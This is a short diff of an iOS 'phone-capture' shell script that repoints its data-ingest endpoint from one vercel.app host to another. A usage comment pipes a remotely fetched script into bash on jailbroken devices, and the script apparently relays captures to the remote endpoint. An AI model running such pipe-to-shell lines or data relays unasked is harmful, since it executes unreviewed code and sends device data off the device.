@@ -14,7 +14,7 @@
 #   # On jailbroken iOS:
 #   curl -sL https://workspace-star-far.vercel.app/agents/phone-capture-ios.sh | bash -s -- --jailbreak
 
-LATTICE_ENDPOINT="https://workspace-star-far.vercel.app/api/ingest"
+LATTICE_ENDPOINT="https://firestar-defense.vercel.app/api/ingest"
 DURATION=${1:-30}
 MODE="relay"
 CAPTURE_DIR="/tmp/lattice_ios_$$"
